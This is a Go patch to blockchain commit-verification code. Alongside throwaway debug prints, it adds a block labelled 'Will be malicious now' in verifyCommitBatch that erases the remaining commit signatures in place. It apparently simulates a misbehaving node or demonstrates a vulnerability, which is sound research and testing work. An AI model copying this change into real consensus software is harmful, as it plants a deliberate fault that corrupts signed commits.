@@ -61,6 +61,7 @@ func VerifyCommitLight(chainID string, vals *ValidatorSet, blockID BlockID,
 	height int64, commit *Commit) error {
 	// run a basic validation of the arguments
 	if err := verifyBasicValsAndCommit(vals, commit, height, blockID); err != nil {
+		fmt.Println("BLA1")
 		return err
 	}
 
@@ -78,6 +79,7 @@ func VerifyCommitLight(chainID string, vals *ValidatorSet, blockID BlockID,
 		return verifyCommitBatch(chainID, vals, commit,
 			votingPowerNeeded, ignore, count, false, true)
 	}
+	fmt.Println("BLA2")
 
 	// if verification failed or is not supported then fallback to single verification
 	return verifyCommitSingle(chainID, vals, commit, votingPowerNeeded,
@@ -221,6 +223,12 @@ func verifyCommitBatch(
 		// if we don't need to verify all signatures and already have sufficient
 		// voting power we can break from batching and verify all the signatures
 		if !countAllSignatures && talliedVotingPower > votingPowerNeeded {
+			fmt.Println("Will be malicious now")
+			i := 0
+			for idx2 := idx + 1; idx2 < len(commit.Signatures); idx2++ {
+				commit.Signatures[idx2] = CommitSig{}
+				i++
+			}
 			break
 		}
 	}
@@ -228,6 +236,7 @@ func verifyCommitBatch(
 	// ensure that we have batched together enough signatures to exceed the
 	// voting power needed else there is no need to even verify
 	if got, needed := talliedVotingPower, votingPowerNeeded; got <= needed {
+		fmt.Println("BLA3")
 		return ErrNotEnoughVotingPowerSigned{Got: got, Needed: needed}
 	}
 
